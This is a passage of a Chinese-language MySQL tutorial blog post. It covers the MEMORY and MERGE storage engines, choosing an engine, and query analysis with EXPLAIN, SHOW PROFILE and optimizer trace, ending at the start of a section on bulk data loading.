<p><strong>数据文件</strong>，都是存储在内存中，这样有利于数据的快速处理，提高整个表的效率。</p>
<p>默认使用<strong>hash索引</strong> ， 但是服务一旦关闭，表中的数据就会丢失。</p>
</blockquote>
<h3 id="Merge"><a href="#Merge" class="headerlink" title="Merge"></a>Merge</h3><p><strong>MERGE存储引擎是一组MyISAM表的组合，这些MyISAM表结构必须完全相同</strong></p>
<p>MERGE表本身并没有存储数据，对MERGE类型的表可以进行select、update、delete操作，这些操作实际上是对内部的MyISAM表进行的。</p>
<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><blockquote>
<p>通过<strong>insert method</strong>子句定义插入的表</p>
<ul>
<li>使用<strong>first或 last</strong>值使得插入操作被相应地作用在第一或者最后一个表上</li>
<li>不定义这个子句或者定义为<strong>no</strong>，表示不能对这个MERGE表执行插入操作</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/1556076359503.png" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table order_1990(</span><br><span class="line">	order_id int ,</span><br><span class="line">	order_money double(10,2),</span><br><span class="line">	order_address varchar(50),</span><br><span class="line">	primary key (order_id)</span><br><span class="line">)engine &#x3D; myisam default charset&#x3D;utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create table order_1991(</span><br><span class="line">	order_id int ,</span><br><span class="line">	order_money double(10,2),</span><br><span class="line">	order_address varchar(50),</span><br><span class="line">	primary key (order_id)</span><br><span class="line">)engine &#x3D; myisam default charset&#x3D;utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create table order_all(</span><br><span class="line">	order_id int ,</span><br><span class="line">	order_money double(10,2),</span><br><span class="line">	order_address varchar(50),</span><br><span class="line">	primary key (order_id)</span><br><span class="line">    -- 插入选择最后一张表</span><br><span class="line">)engine &#x3D; merge union &#x3D; (order_1990,order_1991) insert method&#x3D;last --default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into order_1990 values(1,100.0,&#39;北京&#39;);</span><br><span class="line">insert into order_1990 values(2,100.0,&#39;上海&#39;);</span><br><span class="line"></span><br><span class="line">insert into order_1991 values(10,200.0,&#39;北京&#39;);</span><br><span class="line">insert into order_1991 values(11,200.0,&#39;上海&#39;);</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201019225024416.png" alt="image-20201019225024416" style="zoom:80%;" />

<blockquote>
<p>往order_all中插入一条记录 ，由于在MERGE表定义时，INSERT_METHOD 选择的是<strong>last</strong>，那么插入的数据会向最后一张表中插入。</p>
<p>insert into order_all values(100,10000.0,’西安’)；</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201019225435071.png" alt="image-20201019225435071" style="zoom:80%;" />

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>这个操作只是<strong>删除MERGE表的定义，对内部的表是没有任何影响的</strong>。</p>
<h2 id="存储引擎的选择"><a href="#存储引擎的选择" class="headerlink" title="存储引擎的选择"></a>存储引擎的选择</h2><ul>
<li>InnoDB <ul>
<li>是Mysql的默认存储引擎，用于事务处理应用程序，支持外键。</li>
<li>如果应用对事务的完整性有比较高的要求，在<strong>并发条件下要求数据的一致性</strong>，数据操作除了插入和查询以外，还包含很多的更新、删除操作，那么InnoDB存储引擎是比较合适的选择。</li>
<li>InnoDB存储引擎除了<strong>有效的降低由于删除和更新导致的锁定</strong>， 还可以<strong>确保事务的完整提交和回滚</strong>，对于类似于计费系统或者财务系统等对<strong>数据准确性</strong>要求比较高的系统，InnoDB是最合适的选择。</li>
</ul>
</li>
<li>MyISAM ： 如果应用是以读操作和插入操作为主，只有很少的更新和删除操作，并且对事务的完整性、并发性要求不是很高，那么选择这个存储引擎是非常合适的。</li>
<li>MEMORY：将所有数据保存在RAM中，在需要快速定位记录和其他类似数据环境下，可以提供几块的访问。<ul>
<li>MEMORY的缺陷就是对表的大小有限制，太大的表无法缓存在内存中</li>
<li>其次是要确保表的数据可以恢复，<strong>数据库异常终止后</strong>表中的数据是可以恢复的。</li>
<li>MEMORY表通常用于<strong>更新不太频繁的小表，用以快速得到访问结果。</strong></li>
</ul>
</li>
<li>MERGE：用于将一系列等同的MyISAM表以逻辑方式组合在一起，并作为一个对象引用他们。<ul>
<li>MERGE表的优点在于可以突破对单个MyISAM表的大小限制，并且通过<strong>将不同的表分布在多个磁盘上</strong>，可以<strong>有效的改善MERGE表的访问效率</strong>。这对于存储诸如<strong>数据仓储</strong>等VLDB环境十分合适</li>
</ul>
</li>
</ul>
<h1 id="SQL优化"><a href="#SQL优化" class="headerlink" title="SQL优化"></a>SQL优化</h1><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>数据量增加，性能问题成为整个系统性能的瓶颈。</p>
<h3 id="查看SQL执行频率"><a href="#查看SQL执行频率" class="headerlink" title="查看SQL执行频率"></a>查看SQL执行频率</h3><blockquote>
<p>show [session|global] status 命令提供服务器状态信息。</p>
<ul>
<li><p>session级(当前连接)的统计结果，默认是session.</p>
</li>
<li><p>global级(数据库上次启动至今)的统计结果</p>
</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show status like &#39;Com____&#39;;  -- 针对所有的存储引擎</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show status like &#39;Innodb_rows_%&#39;; -- 针对innodb存储引擎</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Com_***      :  这些参数对于 <code>所有存储引擎</code>的表操作 都会进行累计。</p>
<p>Innodb_*** :  这几个参数只是针对 <code>InnoDB 存储引擎</code> 的，累加的算法也略有不同。</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/1556122799330.png" alt="image-20201019232242970" style="zoom:80%;" /><img src="https://csn.damyoung.cn/image-20201020082620092.png" alt="image-20201020082620092" style="zoom:80%;" /></p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Com_select</td>
<td>执行 select 操作的次数，一次查询只累加 1。</td>
</tr>
<tr>
<td align="left">Com_insert</td>
<td>执行 INSERT 操作的次数，对于批量插入的 INSERT 操作，只累加一次。</td>
</tr>
<tr>
<td align="left">Com_update</td>
<td>执行 UPDATE 操作的次数。</td>
</tr>
<tr>
<td align="left">Com_delete</td>
<td>执行 DELETE 操作的次数。</td>
</tr>
<tr>
<td align="left">Innodb_rows_read</td>
<td>select 查询返回的行数。</td>
</tr>
<tr>
<td align="left">Innodb_rows_inserted</td>
<td>执行 INSERT 操作插入的行数。</td>
</tr>
<tr>
<td align="left">Innodb_rows_updated</td>
<td>执行 UPDATE 操作更新的行数。</td>
</tr>
<tr>
<td align="left">Innodb_rows_deleted</td>
<td>执行 DELETE 操作删除的行数。</td>
</tr>
<tr>
<td align="left">Connections</td>
<td>试图连接 MySQL 服务器的次数。</td>
</tr>
<tr>
<td align="left">Uptime</td>
<td>服务器工作时间。</td>
</tr>
<tr>
<td align="left">Slow_queries</td>
<td>慢查询的次数。</td>
</tr>
</tbody></table>
<h3 id="定位低效率执行SQL"><a href="#定位低效率执行SQL" class="headerlink" title="定位低效率执行SQL"></a>定位低效率执行SQL</h3><p>慢查询日志：用–log-slow-queries[=file name]选项启动时，mysqld写一个包含所有执行时间超过long_query_time秒的SQL语句的日志文件。<strong>慢查询日志在查询结束后才记录</strong>，所以在应用反映执行效率出现问题的时候查询慢查询日志并不能定位问题</p>
<blockquote>
<p>show processlist：可以使用<code>show processlist</code>命令查看当前MySQL在进行的线程</p>
<ul>
<li>包括线程的状态、是否锁表等</li>
<li>可以<strong>实时</strong>地查看 SQL 的执行情况，同时对一些锁表操作进行优化。</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/1556122799330.png" alt="image-20201024163523305" style="zoom:80%;" />

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1） id列，用户登录mysql时，系统分配的&quot;connection_id&quot;，可以使用函数connection_id()查看</span><br><span class="line"></span><br><span class="line">2） user列，显示当前用户。如果不是root，这个命令就只显示用户权限范围的sql语句</span><br><span class="line"></span><br><span class="line">3） host列，显示这个语句是从哪个ip的哪个端口上发的，可以用来跟踪出现问题语句的用户</span><br><span class="line"></span><br><span class="line">4） db列，显示这个进程目前连接的是哪个数据库</span><br><span class="line"></span><br><span class="line">5） command列，显示当前连接的执行的命令，一般取值为休眠（sleep），查询（query），连接（connect）等</span><br><span class="line"></span><br><span class="line">6） time列，显示这个状态持续的时间，单位是秒</span><br><span class="line"></span><br><span class="line">7） state列，显示使用当前连接的sql语句的状态，很重要的列。state描述的是语句执行中的某一个状态。一个sql语句，以查询为例，可能需要经过copying to tmp table、sorting result、sending data等状态才可以完成</span><br><span class="line"></span><br><span class="line">8） info列，显示这个sql语句，是判断问题语句的一个重要依据</span><br></pre></td></tr></table></figure>

<h3 id="explain分析执行计划"><a href="#explain分析执行计划" class="headerlink" title="explain分析执行计划"></a>explain分析执行计划</h3><p>通过 <strong>explain</strong> 或者 <strong>desc</strong> 命令获取 MySQL如何执行 <strong>select</strong> 语句的信息，包括在 SELECT 语句执行过程中<strong>表如何连接和连接的顺序</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">explain</span> <span class="keyword">select</span>*<span class="keyword">from</span> order_all <span class="keyword">where</span> order_id=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/1556122799330.png" alt="image-20201020104105013"></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>select查询的序列号，是一组数字，表示的是查询中执行select子句或者是操作表的顺序。</td>
</tr>
<tr>
<td>select_type</td>
<td>表示 SELECT 的类型，常见的取值有 SIMPLE（简单表，即不使用表连接或者子查询）、PRIMARY（主查询，即外层的查询）、UNION（UNION 中的第二个或者后面的查询语句）、SUBQUERY（子查询中的第一个 SELECT）等</td>
</tr>
<tr>
<td>table</td>
<td>输出结果集的表</td>
</tr>
<tr>
<td>type</td>
<td>表示表的连接类型，性能由好到差的连接类型为( system  —&gt;  const  —–&gt;  eq_ref  ——&gt;  ref  ——-&gt;  ref_or_null—-&gt;  index_merge  —&gt;  index_subquery  —–&gt;  range  —–&gt;  index  ——&gt; all )</td>
</tr>
<tr>
<td>possible_keys</td>
<td>表示查询时，可能使用的索引</td>
</tr>
<tr>
<td>key</td>
<td>表示实际使用的索引</td>
</tr>
<tr>
<td>key_len</td>
<td>索引字段的长度</td>
</tr>
<tr>
<td>rows</td>
<td>扫描行的数量</td>
</tr>
<tr>
<td>extra</td>
<td>执行情况的说明和描述</td>
</tr>
</tbody></table>
<h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><img src="https://csn.damyoung.cn/1556122799330.png" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;t_role&#96; (</span><br><span class="line">  &#96;id&#96; varchar(32) NOT NULL,</span><br><span class="line">  &#96;role_name&#96; varchar(255) DEFAULT NULL,</span><br><span class="line">  &#96;role_code&#96; varchar(255) DEFAULT NULL,</span><br><span class="line">  &#96;description&#96; varchar(255) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  UNIQUE KEY &#96;unique_role_name&#96; (&#96;role_name&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;t_user&#96; (</span><br><span class="line">  &#96;id&#96; varchar(32) NOT NULL,</span><br><span class="line">  &#96;username&#96; varchar(45) NOT NULL,</span><br><span class="line">  &#96;password&#96; varchar(96) NOT NULL,</span><br><span class="line">  &#96;name&#96; varchar(45) NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  UNIQUE KEY &#96;unique_user_username&#96; (&#96;username&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CREATE TABLE &#96;user_role&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL auto_increment ,</span><br><span class="line">  &#96;user_id&#96; varchar(32) DEFAULT NULL,</span><br><span class="line">  &#96;role_id&#96; varchar(32) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;fk_ur_user_id&#96; (&#96;user_id&#96;),</span><br><span class="line">  KEY &#96;fk_ur_role_id&#96; (&#96;role_id&#96;),</span><br><span class="line">  CONSTRAINT &#96;fk_ur_role_id&#96; FOREIGN KEY (&#96;role_id&#96;) REFERENCES &#96;t_role&#96; (&#96;id&#96;) ON DELETE NO ACTION ON UPDATE NO ACTION,</span><br><span class="line">  CONSTRAINT &#96;fk_ur_user_id&#96; FOREIGN KEY (&#96;user_id&#96;) REFERENCES &#96;t_user&#96; (&#96;id&#96;) ON DELETE NO ACTION ON UPDATE NO ACTION</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">insert into &#96;t_user&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;, &#96;name&#96;) values(&#39;1&#39;,&#39;super&#39;,&#39;$2a$10$TJ4TmCdK.X4wv&#x2F;tCqHW14.w70U3CC33CeVncD3SLmyMXMknstqKRe&#39;,&#39;超级管理员&#39;);</span><br><span class="line">insert into &#96;t_user&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;, &#96;name&#96;) values(&#39;2&#39;,&#39;admin&#39;,&#39;$2a$10$TJ4TmCdK.X4wv&#x2F;tCqHW14.w70U3CC33CeVncD3SLmyMXMknstqKRe&#39;,&#39;系统管理员&#39;);</span><br><span class="line">insert into &#96;t_user&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;, &#96;name&#96;) values(&#39;3&#39;,&#39;itcast&#39;,&#39;$2a$10$8qmaHgUFUAmPR5pOuWhYWOr291WJYjHelUlYn07k5ELF8ZCrW0Cui&#39;,&#39;test02&#39;);</span><br><span class="line">insert into &#96;t_user&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;, &#96;name&#96;) values(&#39;4&#39;,&#39;stu1&#39;,&#39;$2a$10$pLtt2KDAFpwTWLjNsmTEi.oU1yOZyIn9XkziK&#x2F;y&#x2F;spH5rftCpUMZa&#39;,&#39;学生1&#39;);</span><br><span class="line">insert into &#96;t_user&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;, &#96;name&#96;) values(&#39;5&#39;,&#39;stu2&#39;,&#39;$2a$10$nxPKkYSez7uz2YQYUnwhR.z57km3yqKn3Hr&#x2F;p1FR6ZKgc18u.Tvqm&#39;,&#39;学生2&#39;);</span><br><span class="line">insert into &#96;t_user&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;, &#96;name&#96;) values(&#39;6&#39;,&#39;t1&#39;,&#39;$2a$10$TJ4TmCdK.X4wv&#x2F;tCqHW14.w70U3CC33CeVncD3SLmyMXMknstqKRe&#39;,&#39;老师1&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;t_role&#96; (&#96;id&#96;, &#96;role_name&#96;, &#96;role_code&#96;, &#96;description&#96;) VALUES(&#39;5&#39;,&#39;学生&#39;,&#39;student&#39;,&#39;学生&#39;);</span><br><span class="line">INSERT INTO &#96;t_role&#96; (&#96;id&#96;, &#96;role_name&#96;, &#96;role_code&#96;, &#96;description&#96;) VALUES(&#39;7&#39;,&#39;老师&#39;,&#39;teacher&#39;,&#39;老师&#39;);</span><br><span class="line">INSERT INTO &#96;t_role&#96; (&#96;id&#96;, &#96;role_name&#96;, &#96;role_code&#96;, &#96;description&#96;) VALUES(&#39;8&#39;,&#39;教学管理员&#39;,&#39;teachmanager&#39;,&#39;教学管理员&#39;);</span><br><span class="line">INSERT INTO &#96;t_role&#96; (&#96;id&#96;, &#96;role_name&#96;, &#96;role_code&#96;, &#96;description&#96;) VALUES(&#39;9&#39;,&#39;管理员&#39;,&#39;admin&#39;,&#39;管理员&#39;);</span><br><span class="line">INSERT INTO &#96;t_role&#96; (&#96;id&#96;, &#96;role_name&#96;, &#96;role_code&#96;, &#96;description&#96;) VALUES(&#39;10&#39;,&#39;超级管理员&#39;,&#39;super&#39;,&#39;超级管理员&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INSERT INTO user_role(id,user_id,role_id) VALUES(NULL, &#39;1&#39;, &#39;5&#39;),(NULL, &#39;1&#39;, &#39;7&#39;),(NULL, &#39;2&#39;, &#39;8&#39;),(NULL, &#39;3&#39;, &#39;9&#39;),(NULL, &#39;4&#39;, &#39;8&#39;),(NULL, &#39;5&#39;, &#39;10&#39;) ;</span><br></pre></td></tr></table></figure>

<h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p>id 字段是 select查询的序列号，是一组数字，表示的是<strong>查询中执行select子句或者是操作表的顺序</strong></p>
<ul>
<li><strong>id 相同</strong>表示加载表的顺序是从上到下。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explain select * from t_role r, t_user u, user_role ur where r.id &#x3D; ur.role_id and u.id &#x3D; ur.user_id ;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/1556122799330.png" alt="image-20201020105535724"></p>
<ul>
<li><strong>id 不同</strong>id值越大，优先级越高，越先被执行。 </li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t_role <span class="keyword">WHERE</span> <span class="keyword">id</span> = (<span class="keyword">SELECT</span> role_id <span class="keyword">FROM</span> user_role <span class="keyword">WHERE</span> user_id = (<span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> t_user <span class="keyword">WHERE</span> username = <span class="string">&#x27;stu1&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201020105627907.png" alt="image-20201020105627907"></p>
<ul>
<li><strong>id 有相同，也有不同，同时存在</strong>。id相同的可以认为是一组，从上往下顺序执行；在所有的组中，id的值越大，优先级越高，越先执行。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> t_role r , (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> user_role ur <span class="keyword">WHERE</span> ur.<span class="string">`user_id`</span> = <span class="string">&#x27;2&#x27;</span>) a <span class="keyword">WHERE</span> r.id = a.role_id ; </span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201020105753608.png" alt="image-20201020105753608"></p>
<h4 id="select-type"><a href="#select-type" class="headerlink" title="select_type"></a>select_type</h4><blockquote>
<p>从上到下执行效率越来越慢</p>
</blockquote>
<table>
<thead>
<tr>
<th>select_type</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>SIMPLE</td>
<td>简单的select查询，查询中不包含子查询或者UNION</td>
</tr>
<tr>
<td>PRIMARY</td>
<td>查询中若包含任何复杂的子查询，<strong>最外层</strong>查询标记为该标识</td>
</tr>
<tr>
<td>SUBQUERY</td>
<td>在SELECT 或 WHERE 列表中<strong>包含了子查询</strong></td>
</tr>
<tr>
<td>DERIVED</td>
<td>在<strong>from</strong>列表中包含的<strong>子查询</strong>，被标记为 DERIVED（衍生） MYSQL会递归执行这些子查询，把结果放在临时表中</td>
</tr>
<tr>
<td>UNION</td>
<td>若第二个SELECT出现在UNION之后，则标记为UNION ； 若UNION包含在FROM子句的子查询中，外层SELECT将被标记为 ： DERIVED</td>
</tr>
<tr>
<td>UNION RESULT</td>
<td>从UNION表获取结果的SELECT</td>
</tr>
</tbody></table>
<p><img src="https://csn.damyoung.cn/image-20201020110651314.png" alt="image-20201020110651314"></p>
<blockquote>
<p><derived2> 表示在衍生表id=2的表中查询</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020110922568.png" alt="image-20201020110922568"></p>
<p><img src="https://csn.damyoung.cn/image-20201020111309059.png" alt="image-20201020111309059"></p>
<h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><p>展示这一行的数据是关于哪一张表的 </p>
<h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p><strong>显示访问类型</strong></p>
<blockquote>
<p>从下到上降低，<strong>一般来说， 我们需要保证查询至少达到 range 级别， 最好达到ref</strong></p>
</blockquote>
<table>
<thead>
<tr>
<th>type</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>NULL</td>
<td>MySQL不访问任何表，索引，直接返回结果</td>
</tr>
<tr>
<td>system</td>
<td><strong>所查询的表只有一行记录</strong>(等于系统表)，这是const类型的特例，一般不会出现</td>
</tr>
<tr>
<td>const</td>
<td>表示通过<strong>索引一次</strong>就找到了，const 用于比较<strong>primary key</strong> 或者 <strong>unique</strong> 索引。因为只匹配一行数据，所以很快。如将主键置于where列表中，MySQL 就能将该查询转换为一个常量。const于将 “主键” 或 “唯一” 索引的所有部分与常量值进行比较</td>
</tr>
<tr>
<td>eq_ref</td>
<td>类似ref，区别在于使用的是唯一索引，使用主键的关联查询，<strong>关联查询出的记录只有一条</strong>。常见于主键或唯一索引扫描</td>
</tr>
<tr>
<td>ref</td>
<td>非唯一性索引扫描，返回匹配某个单独值的所有行。本质上也是一种索引访问，返回所有匹配某个单独值的所有行（多个）</td>
</tr>
<tr>
<td>range</td>
<td>只检索给定返回的行，使用一个索引来选择行。 where 之后出现 <strong>between ， &lt; , &gt; , in</strong> 等操作。</td>
</tr>
<tr>
<td>index</td>
<td>index 与 ALL的区别为  index 类型只是遍历了索引树， 通常比ALL 快， ALL 是遍历数据文件。</td>
</tr>
<tr>
<td>all</td>
<td>将遍历全表以找到匹配的行</td>
</tr>
</tbody></table>
<p><img src="https://csn.damyoung.cn/image-20201020112143416.png" alt="image-20201020112143416"></p>
<p><img src="https://csn.damyoung.cn/image-20201020112243331.png" alt="image-20201020112243331"></p>
<p><img src="https://csn.damyoung.cn/image-20201020112422123.png" alt="image-20201020112422123"></p>
<blockquote>
<p>使用主键的关联查询出来的记录只有一条</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20201020112922768.png" alt="image-20201020112922768"></p>
<p><img src="https://csn.damyoung.cn/image-20201020112948978.png" alt="image-20201020112948978"></p>
<h4 id="key"><a href="#key" class="headerlink" title="key"></a>key</h4><blockquote>
<ul>
<li><p>possible_keys : 显示可能应用在这张表的索引， 一个或多个。 </p>
</li>
<li><p>key ： <strong>实际使用</strong>的索引， 如果为NULL， 则没有使用索引。</p>
</li>
<li><p>key_len : 表示索引中使用的字节数， 该值为索引字段最大可能长度，并非实际使用长度，在不损失精确性的前提下， 长度越短越好 。</p>
</li>
</ul>
</blockquote>
<h4 id="rows"><a href="#rows" class="headerlink" title="rows"></a>rows</h4><p>扫描行的数量。</p>
<h4 id="extra"><a href="#extra" class="headerlink" title="extra"></a>extra</h4><p>其他的额外的执行计划信息，在该列展示 。优化前两个，保持第三个</p>
<table>
<thead>
<tr>
<th>extra</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>using  filesort</td>
<td>说明mysql会对数据使用一个外部的索引排序，而不是按照表内的索引顺序进行读取， 称为 “<strong>文件排序</strong>”, 效率低。</td>
</tr>
<tr>
<td>using  temporary</td>
<td>使用了临时表保存中间结果，MySQL在对查询结果排序时使用<strong>临时表</strong>。常见于 order by 和 group by； 效率低</td>
</tr>
<tr>
<td>using  index</td>
<td>表示相应的select操作使用了<strong>覆盖索引</strong>， 避免访问表的数据行， 效率不错。</td>
</tr>
</tbody></table>
<img src="https://csn.damyoung.cn/image-20201020120436509.png" alt="image-20201020120436509" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20201020120644601.png" alt="image-20201020120644601" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20201020120745269.png" alt="image-20201020120745269" style="zoom:80%;" />

<h3 id="profile分析SQL时间耗费"><a href="#profile分析SQL时间耗费" class="headerlink" title="profile分析SQL时间耗费"></a>profile分析SQL时间耗费</h3><p>show profiles 能够在做SQL优化时帮助我们了解时间都耗费到哪里去了。</p>
<blockquote>
<ul>
<li><p>have_profiling 参数，能够看到当前MySQL是否支持profile：</p>
</li>
<li><p>默认profiling是关闭的，可以通过set语句在Session级别开启profiling：</p>
</li>
</ul>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201020131743822.png" alt="image-20201020131743822" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set profiling&#x3D;1; -- 开启profiling开关</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show profiles;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201020132119836.png" alt="image-20201020132119836" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show profile [cpu] for query 5;</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201020132205385.png" alt="image-20201020132205385" style="zoom:80%;" />

<blockquote>
<p><strong>Sending data</strong> 状态表示MySQL线程开始访问数据行并把结果返回给客户端，而不仅仅是返回个客户端。由于在Sending data状态下，MySQL线程往往需要做大量的磁盘读取操作，所以经常是整各查询中耗时最长的状态。</p>
<ul>
<li>MySQL支持进一步选择all、cpu、block io 、context switch、page faults等明细类型类查看MySQL在使用什么资源上耗费了过高的时间</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Status</td>
<td>sql 语句执行的状态</td>
</tr>
<tr>
<td>Duration</td>
<td>sql 执行过程中每一个步骤的耗时</td>
</tr>
<tr>
<td>CPU_user</td>
<td>当前用户占有的cpu</td>
</tr>
<tr>
<td>CPU_system</td>
<td>系统占有的cpu</td>
</tr>
</tbody></table>
<h3 id="trace分析优化器执行计划"><a href="#trace分析优化器执行计划" class="headerlink" title="trace分析优化器执行计划"></a>trace分析优化器执行计划</h3><p>通过trace文件能够进一步了解为什么优化器<code>optimiter</code>选择A计划, 而不是选择B计划。</p>
<p>打开trace ， 设置格式为 JSON，并设置trace最大能够使用的内存大小，避免解析过程中因为默认内存过小而不能够完整展示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET optimizer_trace&#x3D;&quot;enabled&#x3D;on&quot;,end_markers_in_json&#x3D;on;</span><br><span class="line">set optimizer_trace_max_mem_size&#x3D;1000000;</span><br></pre></td></tr></table></figure>

<p>执行SQL语句 ：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tb_item <span class="keyword">where</span> <span class="keyword">id</span> &lt; <span class="number">4</span>;</span><br></pre></td></tr></table></figure>

<p>最后， 检查information_schema.optimizer_trace就可以知道MySQL是如何执行SQL的 ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from information_schema.optimizer_trace\G;</span><br></pre></td></tr></table></figure>

<h2 id="优化语句"><a href="#优化语句" class="headerlink" title="优化语句"></a>优化语句</h2><h3 id="大批量插入数据"><a href="#大批量插入数据" class="headerlink" title="大批量插入数据"></a>大批量插入数据</h3><p><strong>准备</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;tb_user_1&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;username&#96; varchar(45) NOT NULL,</span><br><span class="line">  &#96;password&#96; varchar(96) NOT NULL,</span><br><span class="line">  &#96;name&#96; varchar(45) NOT NULL,</span><br><span class="line">  &#96;birthday&#96; datetime DEFAULT NULL,</span><br><span class="line">  &#96;sex&#96; char(1) DEFAULT NULL,</span><br><span class="line">  &#96;email&#96; varchar(45) DEFAULT NULL,</span><br><span class="line">  &#96;phone&#96; varchar(45) DEFAULT NULL,</span><br><span class="line">  &#96;qq&#96; varchar(32) DEFAULT NULL,</span><br><span class="line">  &#96;status&#96; varchar(32) NOT NULL COMMENT &#39;用户状态&#39;,</span><br><span class="line">  &#96;create_time&#96; datetime NOT NULL,</span><br><span class="line">  &#96;update_time&#96; datetime DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  UNIQUE KEY &#96;unique_user_username&#96; (&#96;username&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 ;</span><br></pre></td></tr></table></figure>

<p><strong>load执行语句</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;root&#x2F;sql1.log&#39; into </span><br><span class="line"></span><br><span class="line">table tb_user_1 </span><br><span class="line"></span><br><span class="line">fields terminated by &#39;,&#39; </span><br><span class="line"></span><br><span class="line">lines terminated by &#39;\n&#39;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>InnoDB 类型的表，有以下几种方式可以提高导入的效率</p>
</blockquote>
